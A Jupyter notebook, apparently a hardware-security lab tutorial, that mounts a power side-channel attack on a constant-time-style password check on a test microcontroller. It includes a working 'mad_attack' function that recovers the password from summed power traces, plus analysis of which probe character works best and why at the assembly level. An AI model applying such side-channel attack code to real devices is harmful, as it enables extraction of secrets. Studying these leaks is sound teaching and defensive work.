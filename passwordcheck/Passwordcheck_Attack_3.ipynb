{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Attack Password with ~~Timing Analysis~~ Difference Analysis III (MAD)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hide_input": true
   },
   "outputs": [],
   "source": [
    "%run '../util/Metadata.ipynb'\n",
    "print_metadata()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "toc": true
   },
   "source": [
    "<h1>Table of Contents<span class=\"tocSkip\"></span></h1>\n",
    "<div class=\"toc\"><ul class=\"toc-item\"><li><span><a href=\"#Improving-the-code\" data-toc-modified-id=\"Improving-the-code-1\"><span class=\"toc-item-num\">1&nbsp;&nbsp;</span>Improving the code</a></span></li><li><span><a href=\"#Basic-Setup\" data-toc-modified-id=\"Basic-Setup-2\"><span class=\"toc-item-num\">2&nbsp;&nbsp;</span>Basic Setup</a></span></li><li><span><a href=\"#Helper-Functions-for-Password-Attack\" data-toc-modified-id=\"Helper-Functions-for-Password-Attack-3\"><span class=\"toc-item-num\">3&nbsp;&nbsp;</span>Helper Functions for Password Attack</a></span></li><li><span><a href=\"#Try-the-old-Timing-Attack\" data-toc-modified-id=\"Try-the-old-Timing-Attack-4\"><span class=\"toc-item-num\">4&nbsp;&nbsp;</span>Try the old Timing Attack</a></span></li><li><span><a href=\"#MAD-password-attack\" data-toc-modified-id=\"MAD-password-attack-5\"><span class=\"toc-item-num\">5&nbsp;&nbsp;</span>MAD password attack</a></span></li><li><span><a href=\"#Find-good-base-characters\" data-toc-modified-id=\"Find-good-base-characters-6\"><span class=\"toc-item-num\">6&nbsp;&nbsp;</span>Find good base characters</a></span></li><li><span><a href=\"#Analyze-all-possible-base-characters\" data-toc-modified-id=\"Analyze-all-possible-base-characters-7\"><span class=\"toc-item-num\">7&nbsp;&nbsp;</span>Analyze <em>all</em> possible base characters</a></span></li><li><span><a href=\"#Why-different-base-characters-give-different-MADs\" data-toc-modified-id=\"Why-different-base-characters-give-different-MADs-8\"><span class=\"toc-item-num\">8&nbsp;&nbsp;</span>Why different base characters give different MADs</a></span></li><li><span><a href=\"#Disconnect\" data-toc-modified-id=\"Disconnect-9\"><span class=\"toc-item-num\">9&nbsp;&nbsp;</span>Disconnect</a></span></li></ul></div>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In this example we want to improve the `basic-passwdcheck` to be resistant against the attack from the last tutorial.\n",
    "\n",
    "## Improving the code\n",
    "\n",
    "Let's first recap the password checking loop from `basic-passwdcheck`:\n",
    "```c\n",
    "for(uint8_t i = 0; i < sizeof(correct_passwd); i++){\n",
    "    if (correct_passwd[i] != passwd[i]){\n",
    "        passbad = 1;\n",
    "        break;\n",
    "    }\n",
    "}\n",
    "```\n",
    "\n",
    "The timing attack discussed in the last example worked because the loop's runtime varies with the number of correct characters. Once the first wrong character occurs the loop breaks.\n",
    "This is, what we want to change:\n",
    "\n",
    "```c\n",
    "for(uint8_t i = 0; i < sizeof(correct_passwd); i++){\n",
    "    if (correct_passwd[i] != passwd[i]){\n",
    "        passbad = 1;\n",
    "    }\n",
    "}\n",
    "```\n",
    "\n",
    "This is an excerpt from `advanced-passwdcheck.c`. It is clear that the loop does not break after the first wrong character and always all characters of the password are checked. In [Try the old Timing Attack](#Try-the-old-Timing-Attack) we can see that the old timing attack does not work anymore."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Basic Setup"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Define Variables"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%run \"../util/Init.ipynb\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Build target and upload"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "TARGET = 'advanced-passwdcheck'\n",
    "%store TARGET\n",
    "%run \"$HELPERSCRIPTS/Prepare.ipynb\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Import helper functions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%run \"$HELPERSCRIPTS/Setup_Generic.ipynb\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.adc.samples = 500"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Helper Functions for Password Attack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from bokeh.plotting import figure, show \n",
    "from bokeh.io import output_notebook\n",
    "from bokeh.models import CrosshairTool, Label\n",
    "\n",
    "output_notebook()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def cap_pass_trace(pass_guess):\n",
    "    reset_target(scope)\n",
    "    scope.arm()\n",
    "    target.flush()\n",
    "    target.write(pass_guess)\n",
    "    ret = scope.capture()\n",
    "    if ret:\n",
    "        print('Timeout happened during acquisition')\n",
    "\n",
    "    trace = scope.get_last_trace()\n",
    "    \n",
    "    ret = ''\n",
    "    num_char = target.in_waiting()\n",
    "    while num_char > 0:\n",
    "        ret += target.read(num_char, 10)\n",
    "        time.sleep(0.01)\n",
    "        num_char = target.in_waiting()\n",
    "    \n",
    "    return trace, ret"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def sad(trace1, trace2):\n",
    "    return sum(abs(trace1 - trace2))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Try the old Timing Attack\n",
    "\n",
    "Let's try again to see a difference in terms of SAD between a correct and a wrong character."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "outputbuf = \"\"\n",
    "trace1, _ = cap_pass_trace('a\\n')\n",
    "trace2, _ = cap_pass_trace('b\\n')\n",
    "trace3, _ = cap_pass_trace('i\\n')\n",
    "p = figure(height=200)\n",
    "p.add_tools(CrosshairTool())\n",
    "p.line(range(len(trace1)), abs(trace1 - trace2), color='blue',\n",
    "       legend='abs(trace1 - trace2) with SAD = {:.2f}'.format(sad(trace1, trace2)))\n",
    "p.line(range(len(trace1)), abs(trace1 - trace3), color='red', \n",
    "       legend='abs(trace1 - trace3) with SAD = {:.2f}'.format(sad(trace1, trace3)))\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If you run this maybe more than one time you will see that the SAD is around 8-10 and the difference between the SADs is far too low to distinguish right from wrong characters.\n",
    "\n",
    "Did we found a \"secure\" solution where an attacker cannot reveal the password?\n",
    "The answer is simple: No. It's just a bit harder. We just have to tweak the attack a bit. You might recognize a high peek at around position 70 in the plot above. This peek is much higher in the red plot than in the blue one.\n",
    "\n",
    "We can use this peek to still get the attack working."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy\n",
    "def cap_pass_trace_multiple(guess, repetitions):\n",
    "    traces = 0\n",
    "    output = ''\n",
    "    for _ in range(repetitions):\n",
    "        t, o = cap_pass_trace(guess)\n",
    "        traces += t\n",
    "        output += o\n",
    "    return traces, output"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In the style of SAD (sum of absolute differences) we call this MAD: Maximum of absolute differences."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def mad(trace1, trace2):\n",
    "    return max(abs(trace1 - trace2))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If we record more than one trace per attempt we can sum all recorded traces for the same attempt and find out that the peek and especially the difference between the peek hights becomes significant:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "outputbuf = \"\"\n",
    "trace1, out1 = cap_pass_trace_multiple('\\xf8\\n', 2)\n",
    "trace2, out2 = cap_pass_trace_multiple('a\\n', 2)\n",
    "trace3, out3 = cap_pass_trace_multiple('i\\n', 2)\n",
    "\n",
    "p = figure()\n",
    "p.add_tools(CrosshairTool())\n",
    "p.line(range(len(trace1)), abs(trace1 - trace2), color='blue',\n",
    "       legend='abs(trace1 - trace2) with MAD = {:.2f}'.format(mad(trace1, trace2)))\n",
    "p.line(range(len(trace1)), abs(trace1 - trace3), color='red', \n",
    "       legend='abs(trace1 - trace3) with MAD = {:.2f}'.format(mad(trace1, trace3)))\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now we can program an automated version of the password cracker again:\n",
    "\n",
    "## MAD password attack\n",
    "\n",
    "1. Start capturing the base character. Let's call this `base_trace`.\n",
    "2. Capture further characters and calculate the MAD between this and `base_trace`.\n",
    "3. Start from beginning incorporating the found right character.\n",
    "\n",
    "This is very similar to the SAD attack. Except we use a different criterion of distinction and everytime we say 'capture a trace' we mean 'capture a few traces and sum them up'."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def mad_attack(\n",
    "    check_level=0.1,\n",
    "    base_char='\\xf8',\n",
    "    trylist = 'abcdefghijklmnopqrstuvwxyz0123456789'\n",
    "):\n",
    "    password = ''\n",
    "    outputbuf = ''\n",
    "\n",
    "    while 'Welcome' not in outputbuf:\n",
    "        # Capture base_trace with definitly wrong next character\n",
    "        base_trace, _ = cap_pass_trace_multiple(password + base_char + '\\n', 2)\n",
    "\n",
    "        for c in trylist:\n",
    "            # Try character\n",
    "            trace, outputbuf = cap_pass_trace_multiple(password + c + '\\n', 2)\n",
    "            # Check if c is correct\n",
    "            if mad(base_trace, trace) > check_level:\n",
    "                print(\"Success: \" + c)\n",
    "                password += c\n",
    "                break\n",
    "\n",
    "    print('Successfully broken password: ' + password)\n",
    "\n",
    "mad_attack()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "We did not tell why `\\xf8` is a good base character! To give an answer to this question we have to do a detailed analysis:\n",
    "\n",
    "## Find good base characters"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "First we define a function to print out and analyze the *quality* of a single base character."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import tqdm\n",
    "import pandas\n",
    "\n",
    "def test_base_char(base_char):\n",
    "    trylist = 'abcdefghijklmnopqrstuvwxyz0123456789'\n",
    "    stats = []\n",
    "    base_trace, _ = cap_pass_trace_multiple(base_char + '\\n', 2)\n",
    "    for c in tqdm.tqdm_notebook(trylist):\n",
    "        stats.append((\n",
    "            '{:02x}'.format(ord(base_char)) if base_char else '', \n",
    "            c, \n",
    "            mad(base_trace, cap_pass_trace_multiple(c + '\\n', 2)[0])\n",
    "        ))\n",
    "    df = pandas.DataFrame(stats, columns=['base_char', 'char', 'mad'])\n",
    "    df = df.sort_values(by='mad', ascending=False)\n",
    "    return df\n",
    "\n",
    "stats = test_base_char('\\xf8')\n",
    "stats"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This can be also put nicely in a plot:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import bokeh.palettes\n",
    "import bokeh.transform\n",
    "import bokeh.models\n",
    "\n",
    "df = stats.copy().sort_values('char')\n",
    "\n",
    "colormap = bokeh.transform.linear_cmap(\n",
    "    field_name='mad', \n",
    "    palette=bokeh.palettes.Oranges6, \n",
    "    low=max(df['mad']),\n",
    "    high=min(df['mad'])\n",
    ")\n",
    "\n",
    "p = figure(x_range=df['char'])\n",
    "p.add_tools(CrosshairTool())\n",
    "p.vbar(x='char', top='mad', source=df, width=0.5, color=colormap)\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Analyze *all* possible base characters"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import tqdm\n",
    "import pandas as pd\n",
    "\n",
    "def analyse_all_base_chars(\n",
    "    base_list=list(map(chr, range(1, 256))), \n",
    "    trylist='abcdefghijklmnopqrstuvwxyz0123456789',\n",
    "    filename='mad_chars_stats.dat',\n",
    "    password='ifx2019',\n",
    "):\n",
    "    stats = []\n",
    "    for pass_len in tqdm.tqdm_notebook(range(len(password))):\n",
    "        for base_char in tqdm.tqdm_notebook(base_list):\n",
    "            base_trace, _ = cap_pass_trace_multiple(password[:pass_len] + base_char + '\\n', 2)\n",
    "            for c in tqdm.tqdm_notebook(trylist):\n",
    "                stats.append((\n",
    "                    password[pass_len], \n",
    "                    '{:02x}'.format(ord(base_char)), \n",
    "                    c, \n",
    "                    mad(base_trace, cap_pass_trace_multiple(password[:pass_len] + c + '\\n', 2)[0])\n",
    "                ))\n",
    "\n",
    "    stats = pd.DataFrame(stats, columns=['pass_char', 'base_char', 'char', 'mad'])\n",
    "    stats.to_pickle(filename)\n",
    "\n",
    "# Commented because it takes around 4h\n",
    "# analyse_all_base_chars()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "mad_chars_stats = pd.read_pickle('mad_chars_stats.dat')\n",
    "mad_chars_stats"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import bokeh\n",
    "from bokeh.models import LinearColorMapper\n",
    "\n",
    "df = mad_chars_stats.copy()\n",
    "df['disp'] = df['pass_char'] + '-' + df['char']\n",
    "\n",
    "colormap = LinearColorMapper(\n",
    "    palette=bokeh.palettes.PuRd5,\n",
    "    low=min(df.query('char == pass_char').groupby('pass_char').max()['mad']),\n",
    "    high=min(df['mad']),\n",
    ")\n",
    "\n",
    "p = figure(\n",
    "    x_range=df['base_char'].unique(),\n",
    "    y_range=df['disp'].unique(),\n",
    "    plot_height=600,\n",
    "    sizing_mode='stretch_both',\n",
    ")\n",
    "\n",
    "p.rect(x='base_char', y='disp', source=df, width=1, height=1, \n",
    "       fill_color={'field': 'mad', 'transform': colormap},\n",
    "       line_color=None)\n",
    "\n",
    "# Reset ouput to display the graph purely in a new tab\n",
    "# bokeh.io.reset_output()\n",
    "\n",
    "show(p)\n",
    "bokeh.io.output_notebook()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "What can we see in the above heatmap:\n",
    "* Dark rects represent a high MAD value.\n",
    "* Light rects represent a low MAD value.\n",
    "* We can see all the correct characters.\n",
    "* \"Good\" columns are those which do not have many dark rects.\n",
    "* The \"best\" base character is the column where the highest MAD is the most difference from the MAD values that give the correct characters.\n",
    "\n",
    "The \"best\" base character can be also found programmatically:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy\n",
    "import pandas\n",
    "\n",
    "df = mad_chars_stats\n",
    "stats = []\n",
    "for base_char in df['base_char'].unique():\n",
    "    df_base_char = df[df['base_char'] == base_char]\n",
    "    min_pass_char_mad = min(df_base_char.query('pass_char == char')['mad'])\n",
    "    max_guess_char_mad = max(df_base_char.query('pass_char != char')['mad'])\n",
    "    stats.append((base_char, min_pass_char_mad, max_guess_char_mad, min_pass_char_mad - max_guess_char_mad))\n",
    "\n",
    "df = pandas.DataFrame(stats, columns=['base_char', 'min_pass_char_mad', 'max_guess_char_mad', 'diffdiff'])\n",
    "df = df.sort_values(by=['diffdiff'], ascending=False)\n",
    "df"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "And indeed, we found that `\\xf8` is the best base character to crack the password!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Why different base characters give different MADs\n",
    "\n",
    "We found out that not all base characters give equal results. But, what we did not discuss yet is why there is such a difference in the MAD for different base characters.\n",
    "\n",
    "Therefore let's start by comparing two different base characters:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "outputbuf = \"\"\n",
    "trace1, _ = cap_pass_trace_multiple('\\x00\\n', 2)\n",
    "trace2, _ = cap_pass_trace_multiple('\\xff\\n', 2)\n",
    "trace3, _ = cap_pass_trace_multiple('i\\n', 2)\n",
    "trace4, _ = cap_pass_trace_multiple('a\\n', 2)\n",
    "\n",
    "data = [\n",
    "    (abs(trace1 - trace3), '\\\\x00 <-> i'),\n",
    "    (abs(trace1 - trace2), '\\\\x00 <-> \\\\xff'),\n",
    "    (abs(trace2 - trace3), '\\\\xff <-> i'),\n",
    "    (abs(trace4 - trace3), 'a <-> i'),\n",
    "]\n",
    "colors = bokeh.palettes.Set1_8\n",
    "\n",
    "p = figure(x_range=(0, 100), height=400, sizing_mode='stretch_width')\n",
    "p.add_tools(CrosshairTool())\n",
    "for (trace, legend), color in zip(data, colors):\n",
    "    p.line(range(len(trace)), trace, color=color, legend=legend)\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As `scope.clock` is set (by default) to `clkgen_x4` we are recording 4 samples per targets cpu cycle. Looking at aboves figure we can also see this by measuring the distance between two peeks. This means we have three instructions which generate heavy difference. Why?\n",
    "If we want to understand this we have to take a look at the assembly of the respective password comparison loop:\n",
    "\n",
    "```\n",
    "    ldi  r24, 0x00   ; passbad = 0\n",
    "loop:\n",
    "    ld   r20, X+     ; correct_chr = *correct_passwd; correct_passwd++;\n",
    "    ld   r25, Z+     ; chr = *passwd; passwd++;\n",
    "    cpse r20, r25    ; if (correct_chr == chr) skip next instruction;\n",
    "    ldi  r24, 0x01   ; passbad = 1;\n",
    "```\n",
    "\n",
    "__`ld r20, X+`__ <br/>\n",
    "Loading the correct character is the same for every attempt. So, this does not generate much difference.\n",
    "\n",
    "__`ld r25, Z+`__ <br/>\n",
    "Loading the attempt character can generate difference. As we already know, the power consumption of a microcontroller is direct proportional to the hamming weight of the data it processes. Thus, if the character `\\xff` (Hamming weight 8) is loaded during this instruction the power consumption is much different to the one loading `\\x00` (Hamming weight 0).\n",
    "On the other hand this difference is less comparing the characters `\\x00` and `i` (Hamming weight 4).\n",
    "This is exactly what we can see in the different heights of the blue, green and red line at x = 53.\n",
    "\n",
    "__`cpse r20, r25`__ <br/>\n",
    "The comparison itself is a bit harder to analyze. It depends on the one hand by the Hamming weight of the two operands, on the other hand by the previous operations and the result of the comparison. Thus we can examine that the comparison between `\\xff` and `i` is very different to the comparison between `i` and `i`. (The green line). The least difference in the above plot is generated by the red line which represents the comparison of `\\x00` with `i` and `i` with `i`.\n",
    "\n",
    "__`ldi r24, 0x01`__ <br/>\n",
    "This instruction is only executed in `trace3` and all the peaks in lines which include `trace3` show a nearly equal hight. The only one which does not incorporate `trace3` is the blue line where we do not see any peak at this instruction because it is skipped for both traces."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Finally we can put the information about the peak and instruction connection into the plot:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy\n",
    "from bokeh.models import Span, Label, BoxAnnotation\n",
    "import bokeh.palettes\n",
    "\n",
    "# Record traces\n",
    "trace1, _ = cap_pass_trace_multiple('\\x00\\n', 2)\n",
    "trace2, _ = cap_pass_trace_multiple('\\xff\\n', 2)\n",
    "trace3, _ = cap_pass_trace_multiple('i\\n', 2)\n",
    "trace4, _ = cap_pass_trace_multiple('a\\n', 2)\n",
    "\n",
    "data = [\n",
    "    (abs(trace1 - trace3), '\\\\x00 <-> i'),\n",
    "    (abs(trace1 - trace2), '\\\\x00 <-> \\\\xff'),\n",
    "    (abs(trace2 - trace3), '\\\\xff <-> i'),\n",
    "    (abs(trace4 - trace3), 'a <-> i'),\n",
    "]\n",
    "colors = bokeh.palettes.Set1_8\n",
    "\n",
    "p = figure(height=400, x_range=(45, 65), sizing_mode='stretch_width')\n",
    "p.add_tools(CrosshairTool())\n",
    "\n",
    "# Plot annotations\n",
    "indexmaxblue = numpy.argmax(abs(trace1 - trace2))\n",
    "annotations = [indexmaxblue + 4 * i for i in range(-1, 3)]\n",
    "\n",
    "for x, text in zip(annotations, ['ld r20, X+', 'ld r25, Z+', 'cpse r20, r25', 'ldi 24, 0x01']):\n",
    "    p.add_layout(Span(location=x, dimension='height', line_color='darkslateblue', line_width=20, line_alpha=0.1))\n",
    "    p.add_layout(Label(x=x, y=p.plot_height, text=text, y_units='screen', x_offset=-15, y_offset=-50,\n",
    "                       text_align='right', text_color='darkslateblue'))\n",
    "    for (trace, _), color in zip(data, colors):\n",
    "        p.circle(x, trace[x], size=10, color=color)\n",
    "\n",
    "# Plot differences\n",
    "for (trace, legend), color in zip(data, colors):\n",
    "    p.line(range(len(trace)), trace, color=color, legend=legend)\n",
    "\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Disconnect"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.dis()\n",
    "target.dis()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {
    "height": "227px",
    "width": "405.233px"
   },
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": true,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": true,
   "toc_position": {
    "height": "calc(100% - 180px)",
    "left": "10px",
    "top": "150px",
    "width": "296.167px"
   },
   "toc_section_display": true,
   "toc_window_display": true
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
